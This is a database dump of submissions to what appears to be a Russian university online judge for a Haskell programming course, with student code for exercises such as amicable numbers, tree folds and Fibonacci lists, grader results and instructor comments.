(2223, 62, '51559263', '2012-10-17 23:52:28', 1, 'sumDiv n = sum [ m | m <- [1..div n 2], rem n m == 0 ]\r\n\r\n\r\n\r\namicables n = [ (a,b) | a <- [1..n], b <- [a+1..n], a == sumDiv b, b == sumDiv a ]\r\n   --- ОК, но тут, на самом деле можно немного исправить, и получится горадо эффективнее. Мы это сегодня обсудим.\r\n', '<br/>Тесты успешно пройдены!'),
(2224, 62, '374969', '2012-10-17 23:55:15', 0, 'divisors n = [x | x <- [1..(div n 2)], mod n x == 0]\r\nsumDiv = sum . divisors\r\namicables n = [(x, sumDiv x) | x <- [1..n], y = sumDiv x, y > x, x == sumDiv y]\r\n', 'Не удалось вычислить выражение "amicables 300", проверьте правильность синтаксиса'),
(2225, 62, '374969', '2012-10-17 23:55:55', 1, 'divisors n = [x | x <- [1..(div n 2)], mod n x == 0]\r\nsumDiv = sum . divisors\r\namicables n = [(x, sumDiv x) | x <- [1..n], let y = sumDiv x, y > x, x == sumDiv y]', '<br/>Тесты успешно пройдены!'),
(2226, 63, '374969', '2012-10-17 23:59:29', 1, 'fives = 5 :[x*10+5 | x <- fives]\r\n', '<br/>Тесты успешно пройдены!'),
(2227, 63, '51559263', '2012-10-18 00:04:52', 1, 'recFives n = sum ( map (  x -> 5 * 10^(x-1) ) [1..n] ) : recFives (n + 1)\r\n\r\n\r\n\r\nfives = recFives 1 \r\n', '<br/>Тесты успешно пройдены!'),
(2228, 64, '374969', '2012-10-18 01:14:26', 1, 'data Tree = Node Int Tree Tree | Empty\r\nfoldTree op start Empty = start\r\nfoldTree op start (Node val tree1 tree2) = foldTree op (op right val) tree1\r\n                                           where right = foldTree op start tree2', '<br/>Тесты успешно пройдены!'),
(2229, 64, '318210', '2012-10-18 04:50:47', 1, '﻿data Tree a = Empty | Node a (Tree a) (Tree a)\r\n\r\nfoldTree f b с = foldTree1 f b с b\r\n\r\nfoldTree1 f b Empty res = res\r\n\r\nfoldTree1 f b (Node x t1 t2) res =  f ( f (foldTree1 f b t1 b) x ) (foldTree1 f b t2 b)\r\n\r\n--умножение и сложение делает на ура! Если этого не достаточно (или это не то) - напишите, я может быть успею что-нибудь исправить\r\n    --- OK, вполне достаточно, очень хорошо.. Остается вопрос, как бы все-таки это обобщить,\r\n    --- чтобы написать например высоту. Но это мы сегодня обсудим.\r\n', '<br/>Тесты успешно пройдены!'),
(2230, 63, '14561781', '2012-10-18 05:41:05', 1, 'fives = "5" : [x ++ "5" | x <- fives]\r\n  --- Это у вас получиться список строк, а в условии был список списков..\r\n  --- ОК, засчитано, но вы можете подумать, как бы примерно то же сделать с числами, изменить надо не так много\r\n', 'Выражение имеет неправильное значение: take 4 fives'),
(2231, 62, '14561781', '2012-10-18 06:15:08', 1, 'sumDiv n = foldr (+) 0 [x | x <- [1..n `div` 2], n `mod` x == 0]\r\n\r\n\r\n\r\namicables n = [[x, y] | x <- [1..n], y <- [1..(x-1)], sumDiv x == y, sumDiv y == x]\r\n   --- В принципе у вас все правильно, но вы немного перепутали порядок,\r\n   --- первое число в паре дб _меньше_ второго\r\n   --- Еще, вы мб заметили, что ваша программа работает очень медленно. И, на самом деле,\r\n   --- ее очень просто можно существенно ускорить - это мы сегодня обсудим.', 'Выражение имеет неправильное значение: amicables 300'),
(2232, 64, '14561781', '2012-10-18 06:54:26', 1, 'subfoldTree f (x : y : t) = f x y : subfoldTree f t\r\n\r\nsubfoldTree f t = t\r\n\r\n\r\n\r\nfoldTree f e [] = e\r\n\r\nfoldTree f e [x] = x\r\n\r\nfoldTree f e xs = foldTree f e (subfoldTree f xs)\r\n\r\n\r\n\r\nfoldTree (+) 0 [3,5,7,6,4,-1] = 24\r\n\r\nfoldTree (*) 0 [3,5,7,6,4,-1] = -2520\r\n', '<br/>Тесты успешно пройдены!'),
(2233, 64, '5477377', '2012-10-18 06:58:30', 1, 'data BinaryTree a =\r\n	Leaf a\r\n	|Branch a (BinaryTree a) (BinaryTree a)\r\n\r\nfoldTree f x (Leaf a) = f x a\r\nfoldTree f x (Branch a l r) = foldTree f (f (foldTree f x r) a) l\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2234, 58, '3607492', '2012-10-18 06:59:43', 0, 'check _ 0 _= True\r\ncheck (y:[]) n d= (y==n)||(case d of \r\n							t:ts->((test (t:ts) (y:[]) n []))\r\n							_->False)\r\ncheck (x:y:xs) n d= (check ((x*y/(x+y)):xs) n d) \r\n				|| (check ((x+y):xs) n d) \r\n				|| (case xs of\r\n					z:zs->(check ((x+z):y:zs) n d)||(check ((x*z/(x+z)):y:zs) n d)\r\n					_ -> False) \r\n				|| (check (y:xs) n (x:d))\r\n				|| (check (x:xs) n (y:d))\r\n				|| (case d of\r\n					t:ts->(test (t:ts) (x:y:xs) n []) \r\n					_->False)\r\n\r\n\r\n\r\ntest [] _ _ _ = False\r\ntest (d:ds) (x:xs) n f= (check ((x+d):xs) n (ds++f)) || (check ((x*d/(x+d)):xs) n (ds++f) )\r\n || (test ds (x:xs) n (d:f))\r\n\r\n\r\n\r\ncanMakeScheme [] _ = False\r\ncanMakeScheme x n = if ( any (n==) x ) then True else (check x n [])\r\n\r\n{-Исправление по предыдущей задаче, для 9 еще думаю :) -}', '<br/>Тесты успешно пройдены!'),
(2235, 61, '442421', '2012-10-18 07:45:42', 0, '\r\nsumDiv n = if n<0 then 0\r\n	   else sumDiv'' 1 (div n 2) n 0\r\n\r\n\r\nsumDiv'' a b n r = if a>b then r\r\n		  else if mod n a == 0 then sumDiv'' (a+1) b n (r+a)\r\n			else sumDiv'' (a+1) b n r\r\n\r\nperfects n = if n<=0 then []\r\n	     else perfects'' 1 n []\r\n\r\nperfects'' i n x = if i>n then x\r\n			else if i== sumDiv i then perfects'' (i+1) n ([i]++x)\r\n						else perfects'' (i+1) n x', 'Выражение имеет неправильное значение: perfects 100'),
(2236, 61, '442421', '2012-10-18 07:47:35', 0, 'sumDiv 1 = 1\r\nsumDiv n = sumDiv'' 1 (div n 2) n 0\r\n\r\n\r\nsumDiv'' a b n r = if a>b then r\r\n		  else if mod n a == 0 then sumDiv'' (a+1) b n (r+a)\r\n			else sumDiv'' (a+1) b n r\r\n\r\nperfects n = if n<=0 then []\r\n	     else perfects'' 1 n []\r\n\r\nperfects'' i n x = if i>n then x\r\n			else if i== sumDiv i then perfects'' (i+1) n ([i]++x)\r\n						else perfects'' (i+1) n x', 'Выражение имеет неправильное значение: perfects 100'),
(2237, 61, '442421', '2012-10-18 07:50:12', 1, 'sumDiv n = sumDiv'' 1 (div n 2) n 0\r\n\r\n\r\nsumDiv'' a b n r = if a>b then r\r\n		  else if mod n a == 0 then sumDiv'' (a+1) b n (r+a)\r\n			else sumDiv'' (a+1) b n r\r\n\r\nperfects n = if n<=0 then []\r\n	     else perfects'' n n []\r\n\r\nperfects'' i n x = if i<1 then x\r\n			else if i== sumDiv i then perfects'' (i-1) n ([i]++x)\r\n						else perfects'' (i-1) n x', '<br/>Тесты успешно пройдены!'),
(2238, 65, '471091', '2012-10-18 07:51:55', 1, 'cantor = can 1\r\n\r\ncan a = [(x,a) | x <- [1..a]] ++ [(a,y)|y <- reverse [1..(a-1)] ] ++ can (a+1)', '<br/>Тесты успешно пройдены!'),
(2239, 64, '471091', '2012-10-18 08:10:52', 0, 'data Tree = Empty | Node Integer Tree Tree\r\n    deriving (Show)\r\n\r\ntreeToList Empty = []\r\ntreeToList (Node a left right) = [a] ++ treeToList left ++ treeToList right\r\n\r\nfoldTree f a (Node t t1 t2) = foldl f a (treeToList (Node t t1 t2))\r\n\r\nsomeTree = (Node 1 (Node 1 Empty Empty) (Node 1 Empty (Node 1 Empty Empty)))\r\n', '<br/>Тесты успешно пройдены!'),
(2240, 62, '214982', '2012-10-18 08:11:44', 1, '{-думаю, так будет получше-}\r\nsumD n 1 = 1\r\nsumD n k = if (mod n k == 0) then (k + result) else (result) where result = sumD n (k-1)\r\n\r\nsumDiv 0 = 0\r\nsumDiv 1 = 0\r\nsumDiv n = sumD n (div n 2)\r\n\r\nisFriends n k = if (not (sumDiv n == k)) then False else sumDiv k == n\r\n\r\ngetAllFriends 1 k = []\r\ngetAllFriends n k = if (isFriends n k) then (n, k):result else result where result = getAllFriends (n-1) k\r\n\r\namicables 1 = []\r\namicables n = amicables (n - 1):(getAllFriends (n - 1) n) \r\n    --- Тут что-то странное. Вы к концу списка, что ли приписываете с помощью (:) - но это делать нельзя..', 'Не удалось вычислить выражение "amicables 300", проверьте правильность синтаксиса'),
(2241, 64, '471091', '2012-10-18 08:13:13', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n    deriving (Show)\r\n\r\ntreeToList Empty = []\r\ntreeToList (Node a left right) = [a] ++ treeToList left ++ treeToList right\r\n\r\nfoldTree f a (Node t t1 t2) = foldl f a (treeToList (Node t t1 t2))\r\n\r\nsomeTree = (Node 1 (Node 1 Empty Empty) (Node 1 Empty (Node 1 Empty Empty)))\r\n\r\nsumResult  = foldTree (+) 0 someTree\r\nprodResult = foldTree (*) 1 someTree\r\n', '<br/>Тесты успешно пройдены!'),
(2242, 62, '442421', '2012-10-18 08:22:08', 1, 'sumDiv n = sumDiv'' 1 (div n 2) n 0\r\n\r\n\r\nsumDiv'' a b n r = if a>b then r\r\n		  else if mod n a == 0 then sumDiv'' (a+1) b n (r+a)\r\n			else sumDiv'' (a+1) b n r\r\n\r\n\r\ncreatePair n = map (x->(x,sumDiv x))[1..n]\r\n\r\namicables n =  amicables'' (createPair n)\r\n\r\namicables'' ((a,b):((c,d):[])) = if a==d && b==c then [(a,b)] else []\r\n\r\namicables'' (y:(x:xs))= (checkPair y (x:xs) [])++(amicables'' (x:xs))\r\n\r\n\r\ncheckPair (a,b) [] r = r\r\n\r\ncheckPair (a,b) ((c,d):xs) r = if a==d && b==c then checkPair (a,b) xs ([(a,c)]++r)\r\n				else checkPair (a,b) xs r', '<br/>Тесты успешно пройдены!'),
(2243, 63, '442421', '2012-10-18 08:32:33', 1, 'fives = map (x->five x) [1, 2..]\r\n   --- Ну или просто map five \r\nfive n = five'' 0 n 0\r\n\r\nfive'' i n r = if i==n then r\r\n		else five'' (i+1) n (r+5*(10^i))', '<br/>Тесты успешно пройдены!'),
(2244, 58, '3607492', '2012-10-18 08:47:32', 2, '  --- Нет, не совсем правильно :(\r\n  --- Вот такой тест не проходит\r\n  ---   canMakeScheme [13,2,30,3,7] 6\r\n  --- Возвращает False (причем canMakeScheme1 [13,2,3,7] 6 возвращает True..)\r\n  --- Попробуйте исправить, если хотите, но мне кажется 12-3 так просто не решить, она сложная..\r\ntest [] _ _ _ _= False\r\n\r\ntest (d:ds) 0 n f t = (d==n) || (test (ds++f) d n [] 1)|| (if (t==0) then (test ds 0 n (d:f) 0) else False)\r\ntest (d:ds) t n f x= (test ds t n (d:f) 1) || (test (ds++((t+d):f)) 0 n [] 1)||  (test (ds++((t*d/(t+d)):f)) 0 n [] 1)\r\n \r\n\r\n\r\n\r\ncanMakeScheme [] _ = False\r\ncanMakeScheme x n = if ( any (n==) x ) then True else (test x 0 n [] 0)\r\n\r\nmain = print (canMakeScheme [1,2,3,4,5,6,7,8,9] (-41))\r\n\r\n{-19 минут считало.. Надо где-то заоптимизировать, но вроде работает..-}', '<br/>Тесты успешно пройдены!'),
(2245, 64, '442421', '2012-10-18 08:48:43', 1, '--пункт а\r\ndata Tree=Empty|Node Integer Tree Tree deriving Show\r\n\r\nfoldTree f a x = foldr f a (treeToList x)\r\n\r\ntreeToList Empty = []\r\n\r\ntreeToList (Node a l r) = [a]++(treeToList l)++(treeToList r)\r\n\r\n\r\n-----foldTree (+) 5 (Node 1 (Node 2 Empty (Node 3 Empty Empty)) (Node 4 (Node 5 Empty Empty) Empty))\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2246, 64, '83813', '2012-10-18 08:55:43', 1, 'data Node = Node Integer Node Node | Empty deriving Show\r\n\r\n\r\n\r\nfoldTree op acc Empty = acc\r\n\r\nfoldTree op acc (Node data_ left_ right_) = op data_ (foldTree op acc left_) (foldTree op acc right_)\r\n\r\n\r\n\r\ntree1 = (Node 5 (Node 1 (Node 2 Empty Empty) Empty) (Node 3 Empty Empty))\r\n\r\n\r\n\r\n-- sum\r\n\r\ntest1 = foldTree (x l r -> x + l + r) 0 tree1\r\n\r\n-- product\r\n\r\ntest2 = foldTree (x l r -> x * l * r) 1 tree1\r\n\r\n-- any\r\n\r\ntest3 = foldTree (x l r -> l || r || (x `mod` 2 == 1)) False tree1\r\n\r\n-- height\r\n\r\ntest4 = foldTree (x l r -> (1 +) $ max l r)  0 tree1\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2247, 63, '1384577', '2012-10-18 11:20:54', 1, 'th = [x | i <- [0..], let x = 5*10^i]\r\nfives = scanl1 (+) th\r\n   --- Засчитано, но вообще в прислали позже срока. Присылайте, пожалуйста, вовремя - в следующий раз не засчитаю.. ', '<br/>Тесты успешно пройдены!'),
(2248, 67, '3431532', '2012-10-18 17:58:30', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.IO;\r\nusing System.Text;\r\n\r\nnamespace ConsoleApplication1\r\n{\r\n    class Program\r\n    {\r\n        static void Main(string[] args)\r\n        {\r\n\r\n            List<long> list = new List<long>();\r\n            list.Add(254543); list.Add(3453443); list.Add(3334); list.Add(392323);\r\n\r\n            foreach (long x in zeroDigits(list, 3))\r\n                 Console.WriteLine(x);\r\n\r\n        }\r\n\r\n        static List<long> zeroDigits(List<long> items, int n)\r\n        {\r\n            return items.Select(x => (long)Math.Pow(10,n)*(x/((long)Math.Pow(10,n)))).ToList();\r\n               --- ОК, но, конечно, Pow лучше считать один раз\r\n        }\r\n\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2249, 64, '550896', '2012-10-18 19:53:28', 1, 'data Tree = Empty | Node Int Tree Tree\r\n\r\nflatten :: Tree -> [Int]\r\nflatten Empty = []\r\nflatten (Node a left right) = [a] ++ flatten left ++ flatten right\r\n\r\nfoldTree :: (Int -> Int -> Int) -> Int -> Tree -> Int\r\nfoldTree op x t = foldTree0 op x (flatten t)\r\n\r\nfoldTree0 :: (Int -> Int -> Int) -> Int -> [Int] -> Int\r\nfoldTree0 op x a | null a = x\r\nfoldTree0 op x a = foldTree0 op (op x (head a)) (tail a)', '<br/>Тесты успешно пройдены!'),
(2250, 69, '517309', '2012-10-18 20:28:30', 3, 'bigSin _ = 0.990607', '<br/>Тесты успешно пройдены!'),
(2251, 70, '517309', '2012-10-18 20:29:03', 3, 'myFilter = filter', '<br/>Тесты успешно пройдены!'),
(2252, 65, '472848', '2012-10-18 20:29:20', 1, 'cantor = [(i, n-i)| n <- [2..], i <- [1..n - 1]]', '<br/>Тесты успешно пройдены!'),
(2253, 71, '517309', '2012-10-18 20:30:16', 0, 'approxSum = sum . take 100000', 'Не удалось вычислить выражение "let x = approxSum [1/(i^2) | i<-[1..]] in (x>1.64 && x<1.65)", проверьте правильность синтаксиса'),
(2254, 71, '517309', '2012-10-18 20:31:03', 0, 'approxSum _ = 1.641', '<br/>Тесты успешно пройдены!'),
(2255, 71, '517309', '2012-10-18 20:31:47', 0, 'approxSum = sum . take 10000', 'Не удалось вычислить выражение "let x = approxSum [1/(i^2) | i<-[1..]] in (x>1.64 && x<1.65)", проверьте правильность синтаксиса'),
(2256, 71, '517309', '2012-10-18 20:32:28', 0, 'approxSum xs = sum (take 10000 xs)', '<br/>Тесты успешно пройдены!'),
(2257, 72, '517309', '2012-10-18 20:33:50', 0, 'wm = [0,0,0,0,0,1,1] ++ wm\r\n\r\nweekendExpences xs = sum (zipWith (*) xs wm)', '<br/>Тесты успешно пройдены!'),
(2258, 69, '3431532', '2012-10-18 20:34:19', 2, 'bigSin x = getArg x 1\r\n\r\ngetArg x y | sin y >= x = sin y\r\ngetArg x y = getArg x (y+1)\r\n   --- Нет, это не по условию, тут же вообще нельзя определять свои функции (кроме bigSin, конечно)', '<br/>Тесты успешно пройдены!'),
(2259, 72, '517309', '2012-10-18 20:34:24', 3, 'wm = [0,0,0,0,0,1,1] ++ wm\r\n\r\nweekendExpences = sum . zipWith (*) wm', '<br/>Тесты успешно пройдены!'),
(2260, 73, '517309', '2012-10-18 20:35:26', 3, 'fibs = [1,1,2,3,5,8,13,21,34,55,89]', '<br/>Тесты успешно пройдены!'),
(2261, 74, '517309', '2012-10-18 20:36:36', 0, 'data Tree = Empty | Node Int Tree Tree\r\n\r\nsumPos _ = 7', 'Не удалось вычислить выражение "sumPos (Node 3 (Node -1 Empty Empty) (Node 4 Empty Empty))", проверьте правильность синтаксиса'),
(2262, 71, '3431532', '2012-10-18 20:36:50', 1, 'approxSum (x:xs) | abs(x)>0.000001 = x + approxSum xs\r\napproxSum x = 0', '<br/>Тесты успешно пройдены!'),
(2263, 69, '472848', '2012-10-18 20:37:04', 1, 'bigSin x = head (filter (y->y> x) [sin i|i<-[1..]])\r\n   --- Просто как замечание, можно короче filter (>x)', '<br/>Тесты успешно пройдены!'),
(2264, 73, '3431532', '2012-10-18 20:39:56', 1, 'fibs = 1 : 1 : zipWith (+) fibs (tail fibs)\r\n\r\n-- решение знал по памяти (давно на втором курсе решали :) )\r\n   -- OK)', '<br/>Тесты успешно пройдены!'),
(2265, 76, '517309', '2012-10-18 20:43:36', 3, 'class Shape a where\r\n  perimeter:: a -> Double\r\n\r\ndata Circle = Circle Double\r\n\r\ninstance Shape Circle where\r\n   perimeter (Circle r) = 6.28 * r\r\n\r\ndata Rect = Rect Double Double\r\n\r\ninstance Shape Rect where\r\n   perimeter (Rect x y) = 2*(x+y)\r\n', '<br/>Тесты успешно пройдены!'),
(2266, 74, '517309', '2012-10-18 20:46:58', 3, 'data Tree = Empty | Node Int Tree Tree\r\n\r\nsumPos _ = 7\r\n', '<br/>Тесты успешно пройдены!'),
(2267, 72, '44060', '2012-10-18 20:56:28', 1, 'weekendExpences l = sum (zipWith (*) l week)\r\n			where \r\n				week = 0:0:0:0:0:1:1:week', '<br/>Тесты успешно пройдены!'),
(2268, 73, '63706456', '2012-10-18 20:57:57', 1, 'fibs = 1: zipWith (+) (0:fibs) fibs', '<br/>Тесты успешно пройдены!'),
(2269, 71, '44060', '2012-10-18 20:58:21', 0, 'approxSum (x:xs) = if (x > 0.0001)||(x < (-0.0001)) then (x + approxSum xs) else 0.0', 'Выражение имеет неправильное значение: let x = approxSum [1/(i^2) | i<-[1..]] in (x>1.64 && x<1.65)'),
(2270, 71, '44060', '2012-10-18 20:59:25', 0, 'approxSum (x:xs) = if (x > 0.0001)||(x < (-0.0000001)) then (x + approxSum xs) else 0.0', 'Выражение имеет неправильное значение: let x = approxSum [1/(i^2) | i<-[1..]] in (x>1.64 && x<1.65)'),
(2271, 71, '44060', '2012-10-18 20:59:41', 1, 'approxSum (x:xs) = if (x > 0.000001)||(x < (-0.000001)) then (x + approxSum xs) else 0.0', '<br/>Тесты успешно пройдены!'),
(2272, 69, '44060', '2012-10-18 21:03:37', 1, 'bigSin y = head (filter (x -> x > y) (map sin [1..]))\r\n   --- Или немного короче испоьзовать section:  filter (>y)  и т.д.', '<br/>Тесты успешно пройдены!'),
(2273, 73, '44060', '2012-10-18 21:05:47', 1, 'fibs = f 1 1\r\n	where f x y = let z = x+y in x : f y z', '<br/>Тесты успешно пройдены!'),
(2274, 70, '2562137', '2012-10-18 21:12:25', 1, 'myFilter _ [] = []\r\nmyFilter fun list = foldr (x xs -> if (fun x) then (x:xs) else xs) [] list\r\n', '<br/>Тесты успешно пройдены!'),
(2275, 69, '2562137', '2012-10-18 21:12:45', 1, 'bigSin x = head (filter (s -> s >= x) [sin n | n <- [1..]])', '<br/>Тесты успешно пройдены!'),
(2276, 71, '2562137', '2012-10-18 21:15:42', 1, 'approxSum list = f list 0\r\n\r\nf [] sum = sum\r\nf (x:xs) sum =\r\n	if (abs x < 0.000001) then sum\r\n	else f xs (sum + x)\r\n', '<br/>Тесты успешно пройдены!'),
(2277, 71, '63706456', '2012-10-18 21:18:25', 2, 'approxSum = sum . takeWhile (> 0.000001)\r\n  --- Извините, я по ходу дела немного поменял условие, из-за этого получилась ошибка. \r\n  --- Но у вас все равно не совсем правильно, ведь последовательность может содержать и отрицательные числа.\r\n  --- Исправьте, хорошо?', 'Не удалось вычислить выражение "z>1.64 && z<1.65", проверьте правильность синтаксиса'),
(2278, 71, '63706456', '2012-10-18 21:18:48', 2, 'approxSum ls = sum $ takeWhile (> 0.000001) ls\r\n   --- Условие немного поменялось по ходу дела, обратите внимание..', 'Не удалось вычислить выражение "z>1.64 && z<1.65", проверьте правильность синтаксиса'),
(2279, 69, '374969', '2012-10-18 21:30:45', 1, 'bigSin arg = head (filter (x -> x>arg) [sin y|y<-[1..]])', '<br/>Тесты успешно пройдены!'),
(2280, 69, 'Deutsche', '2012-10-18 21:30:49', 1, 'bigSin x = (filter (y -> y>=x) [(sin i) | i<-[1..]]) !! 0', '<br/>Тесты успешно пройдены!'),
(2281, 70, 'Deutsche', '2012-10-18 21:32:35', 1, 'myFilter f = foldr (x -> if (f x) then (x:) else id) []', '<br/>Тесты успешно пройдены!'),
(2282, 71, '517309', '2012-10-18 21:34:07', 3, 'approxSum ls = sum $ takeWhile (> 0.000001) ls\r\nz = approxSum [1/(i*i) | i<-[1..]]', 'Хитрый тест номер 1 не пройден :(<br/>Подсказка: Последовательность может содержать и отрицательные числа'),
(2283, 70, '374969', '2012-10-18 21:35:34', 1, 'myFilter cond = foldr (x y -> if(cond x) then x:y else y) []', '<br/>Тесты успешно пройдены!'),
(2284, 72, '2562137', '2012-10-18 21:36:18', 1, 'weekendExpences list = foldr (x y -> (fst x) + y) 0 (filter (p -> mod (snd p) 7 > 4) (zip list [0..]))', '<br/>Тесты успешно пройдены!'),
(2285, 71, 'Deutsche', '2012-10-18 21:38:11', 1, 'approxSum s = apSum s 0\r\napSum (x:s) res = if ((abs x)<=0.000001) \r\n			then res\r\n		   else apSum s (res+x)\r\nz = approxSum [1/(i^2) | i<-[1..]]', '<br/>Тесты успешно пройдены!'),
(2286, 71, '374969', '2012-10-18 21:55:32', 1, 'approxSum lst = sum (takeWhile (x -> abs x > 0.000001) lst)\r\nz = approxSum [1.0/(x*x) | x <- [1..]]', '<br/>Тесты успешно пройдены!'),
(2287, 73, '2562137', '2012-10-18 21:58:37', 1, 'fibs = 1:1:(f 1 1) where\r\n	f a b = (a+b) : f b (a+b)', '<br/>Тесты успешно пройдены!'),
(2288, 73, 'Deutsche', '2012-10-18 21:59:18', 1, '-- поэлементное суммирование списка с его сдвигом (по тому же принцину, как на занятии с факториалом)\r\nfibs = 1:1:(zipWith (+) fibs (tail fibs))\r\n', '<br/>Тесты успешно пройдены!'),
(2289, 57, '83813', '2012-10-18 23:33:07', 0, 'import Data.List\n\n\n\ngensplits :: (Integral r) => [r] -> [([r], [r])]\n\ngensplits [r] = [([], [r])]\n\ngensplits (r:rs) = concat [[(r:left, right), (left, r:right)] | ltup <- gensplits rs, let left = fst ltup, let right = snd ltup]\n\n\n\nsummarize :: [Double] -> [Double] -> [Double]\n\nsummarize l1 l2 = {-nub-} [x + y | x <- l1, y <- l2]\n\n\n\naver :: [Double] -> [Double] -> [Double]\n\naver l1 l2 = {-nub-} [(x1 * x2) / (x1 + x2) | x1 <- l1, x2 <- l2]\n\n\n\ngenRsMustParallel :: (Integral r) => [r] -> [Double]\n\ngenRsMustParallel [r] = [fromIntegral r]\n\ngenRsMustParallel rs = {-nub $ -}concat [(aver left right) |\n\n                              ltup <- gensplits rs,\n\n                                not $ null $ fst ltup,\n\n                                let left = genRs $ fst ltup,\n\n                                let right = genRsMustSerial $ snd ltup]\n\n\n\n\n\ngenRsMustSerial :: (Integral r) => [r] -> [Double]\n\ngenRsMustSerial [r] = [fromIntegral r]\n\ngenRsMustSerial rs = {-nub $ -}concat [(summarize left right) |\n\n                              ltup <- gensplits rs,\n\n                                not $ null $ fst ltup,\n\n                                let left = genRs $ fst ltup,\n\n                                let right = genRsMustParallel $ snd ltup]\n\n\n\ngenRs :: (Integral r) => [r] -> [Double]\n\ngenRs [r] = [fromIntegral r]\n\n\n\ngenRs rs = (genRsMustParallel rs) ++ (genRsMustSerial rs)\n\n-- calculates list length in 200 seconds on my pc\n\n\n\ncanMakeScheme rs n = n `elem` (genRs rs)\n\n\n', 'Выражение имеет неправильное значение: canMakeScheme [13, 7, 2, 3] 7'),
(2290, 57, '83813', '2012-10-18 23:40:27', 1, 'import Data.List\r\n\r\n\r\n\r\ngensplits :: (Integral r) => [r] -> [([r], [r])]\r\n\r\ngensplits [r] = [([], [r])]\r\n\r\ngensplits (r:rs) = concat [[(r:left, right), (left, r:right)] | ltup <- gensplits rs, let left = fst ltup, let right = snd ltup]\r\n\r\n\r\n\r\nsummarize :: [Double] -> [Double] -> [Double]\r\n\r\nsummarize l1 l2 = {-nub-} [x + y | x <- l1, y <- l2]\r\n\r\n\r\n\r\naver :: [Double] -> [Double] -> [Double]\r\n\r\naver l1 l2 = {-nub-} [(x1 * x2) / (x1 + x2) | x1 <- l1, x2 <- l2]\r\n\r\n\r\n\r\ngenRsMustParallel :: (Integral r) => [r] -> [Double]\r\n\r\ngenRsMustParallel [r] = [fromIntegral r]\r\n\r\ngenRsMustParallel rs = {-nub $ -}concat [(aver left right) |\r\n\r\n                              ltup <- gensplits rs,\r\n\r\n                                not $ null $ fst ltup,\r\n\r\n                                let left = genRs $ fst ltup,\r\n\r\n                                let right = genRsMustSerial $ snd ltup]\r\n\r\n\r\n\r\n\r\n\r\ngenRsMustSerial :: (Integral r) => [r] -> [Double]\r\n\r\ngenRsMustSerial [r] = [fromIntegral r]\r\n\r\ngenRsMustSerial rs = {-nub $ -}concat [(summarize left right) |\r\n\r\n                              ltup <- gensplits rs,\r\n\r\n                                not $ null $ fst ltup,\r\n\r\n                                let left = genRs $ fst ltup,\r\n\r\n                                let right = genRsMustParallel $ snd ltup]\r\n\r\n\r\n\r\ngenRs :: (Integral r) => [r] -> [Double]\r\n\r\ngenRs [] = []\r\n\r\ngenRs [r] = [fromIntegral r]\r\n\r\n\r\n\r\ngenRs rs = (genRsMustParallel rs) ++ (genRsMustSerial rs)\r\n\r\n-- calculates list length in 200 seconds on my pc for [1,2,3,4,5,6,7,8,9]\r\n\r\n\r\n\r\ncanMakeScheme rs n = True `elem` [n `elem` result | list <- subsequences rs, let result = genRs list]\r\n\r\n-- the problem of ability not to use all of resistors slows down the solution twice\r\n\r\n-- so canMakeScheme [1,2,3,4,5,6,7,8,9] 200 will run in about 400 secs\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2291, 58, '83813', '2012-10-18 23:40:48', 1, 'import Data.List\r\n\r\n\r\n\r\ngensplits :: (Integral r) => [r] -> [([r], [r])]\r\n\r\ngensplits [r] = [([], [r])]\r\n\r\ngensplits (r:rs) = concat [[(r:left, right), (left, r:right)] | ltup <- gensplits rs, let left = fst ltup, let right = snd ltup]\r\n\r\n\r\n\r\nsummarize :: [Double] -> [Double] -> [Double]\r\n\r\nsummarize l1 l2 = {-nub-} [x + y | x <- l1, y <- l2]\r\n\r\n\r\n\r\naver :: [Double] -> [Double] -> [Double]\r\n\r\naver l1 l2 = {-nub-} [(x1 * x2) / (x1 + x2) | x1 <- l1, x2 <- l2]\r\n\r\n\r\n\r\ngenRsMustParallel :: (Integral r) => [r] -> [Double]\r\n\r\ngenRsMustParallel [r] = [fromIntegral r]\r\n\r\ngenRsMustParallel rs = {-nub $ -}concat [(aver left right) |\r\n\r\n                              ltup <- gensplits rs,\r\n\r\n                                not $ null $ fst ltup,\r\n\r\n                                let left = genRs $ fst ltup,\r\n\r\n                                let right = genRsMustSerial $ snd ltup]\r\n\r\n\r\n\r\n\r\n\r\ngenRsMustSerial :: (Integral r) => [r] -> [Double]\r\n\r\ngenRsMustSerial [r] = [fromIntegral r]\r\n\r\ngenRsMustSerial rs = {-nub $ -}concat [(summarize left right) |\r\n\r\n                              ltup <- gensplits rs,\r\n\r\n                                not $ null $ fst ltup,\r\n\r\n                                let left = genRs $ fst ltup,\r\n\r\n                                let right = genRsMustParallel $ snd ltup]\r\n\r\n\r\n\r\ngenRs :: (Integral r) => [r] -> [Double]\r\n\r\ngenRs [] = []\r\n\r\ngenRs [r] = [fromIntegral r]\r\n\r\n\r\n\r\ngenRs rs = (genRsMustParallel rs) ++ (genRsMustSerial rs)\r\n\r\n-- calculates list length in 200 seconds on my pc for [1,2,3,4,5,6,7,8,9]\r\n\r\n\r\n\r\ncanMakeScheme rs n = True `elem` [n `elem` result | list <- subsequences rs, let result = genRs list]\r\n\r\n-- the problem of ability not to use all of resistors slows down the solution twice\r\n\r\n-- so canMakeScheme [1,2,3,4,5,6,7,8,9] 200 will run in about 400 secs\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2292, 70, '3431532', '2012-10-19 05:51:07', 0, 'myFilter f (x:xs) | f x = x : (myFilter f xs)\r\nmyFilter f (x:xs) = myFilter f xs\r\nmyFilter f [] = []', '<br/>Тесты успешно пройдены!'),
(2293, 70, '3431532', '2012-10-19 06:09:34', 1, 'myFilter f x = foldr (xs -> if f xs then (xs:) else id) [] x\r\n', '<br/>Тесты успешно пройдены!'),
(2294, 73, '3607492', '2012-10-19 06:42:21', 1, 'fibs = (1:1:(zipWith (+) fibs (tail fibs)))\r\n\r\nmain = print (take 10 fibs)\r\n\r\n{-Использовал такую же штуку в 6.3 :) -}', '<br/>Тесты успешно пройдены!'),
(2295, 59, '318210', '2012-10-19 06:42:28', 1, 'Problem sent by mail', '<br/>Тесты успешно пройдены!'),
